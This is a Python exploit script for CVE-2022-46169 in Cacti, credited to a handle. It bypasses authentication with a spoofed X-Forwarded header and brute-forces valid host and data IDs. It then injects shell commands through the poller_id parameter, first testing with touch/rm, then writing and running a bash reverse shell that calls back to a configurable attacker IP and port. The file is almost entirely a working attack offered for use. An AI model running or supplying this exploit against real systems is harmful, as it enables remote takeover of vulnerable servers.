#! /usr/bin/python3 
 
'''
CVE-2022-46169
Author: @_ce3rb3ru5__


'''
import requests
import argparse
import random
import sys
#remember to change the IP and PORT 
IP= "0.0.0.0"
PORT="1234"

argP= argparse.ArgumentParser()
argP.add_argument("-u", "--url",help="Victim URL")
argP.add_argument("-f", "--forwarded",help="X-Forwarded value to bypass the auth")
args=argP.parse_args()
url=args.url+"/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=1"
print(f"YOUR URL: {args.url} ")
#auth bypass -------------------------------------
#you can bypass this with 127.0.0.1 or with the victim's IP itself
headers = {'X-Forwarded':args.forwarded}
req = requests.get(url, headers=headers)
print("[+] Bypassing auth...")
if req.text != "FATAL: You are not authorized to use this service":
    print("[+] Bypassing success!")
else:
    print("[+]Bypassing failed.")
    print("[+]Not vulnerable or X-Forwarded value was wrong.")
    sys.exit()
    

#bruteforce -------------------------------------
final_args = []
print("[+] Bruteforcing host_id and local_data_ids[] args.")
#this will bruteforce the host_id and local_data_ids[] to find some valid value and save it 
for i in range(1,10):
    for f in range(1,10):
        brute_url = args.url+"/remote_agent.php?action=polldata&poller_id=1&host_id="+str(i)+"&local_data_ids[]="+str(f)
        brute_req = requests.get(brute_url, headers=headers)
        if brute_req.text != "[]":
            final_args.append("host_id="+str(i)+"&local_data_ids[]="+str(f))
i       
if final_args:
    print("[+] Bruteforce success!")
else:
    print("[+] Bruteforce failed.")
    
    
#command injection ------------------------------------
good_args = []
for j in final_args:
    inject_url = args.url+"/remote_agent.php?action=polldata&poller_id=;touch%20test.txt&"+j
    inject_req = requests.get(inject_url, headers=headers)
    get_textfile = requests.get(args.url+"/test.txt",headers=headers)
    if get_textfile.status_code == 200:
        print("[+] Trying with "+j)
        good_args.append(j)
        #remove the file created above
        inject_url = args.url+"/remote_agent.php?action=polldata&poller_id=;rm%20test.txt&"+j
        requests.get(inject_url,headers=headers)
# remote code execution -----------------------------------
#here we create and deliver the payload into the actual directory 
payload_url = args.url+"/remote_agent.php?action=polldata&poller_id=;echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F"+IP+"%2F"+PORT+"%200%3E%261%22%20%3E%20shell.sh&"+ random.choice(good_args)
print("[+] sending the payload...")
requests.get(payload_url, headers=headers)
print("[+] running the exploit...")
#right here we execute the payload that we already upload
rce_url = args.url+"/remote_agent.php?action=polldata&poller_id=;bash%20shell.sh&host_id=2&&local_data_ids%5B%5D=6"
req_rce = requests.get(rce_url,headers=headers)
print(req_rce.text)












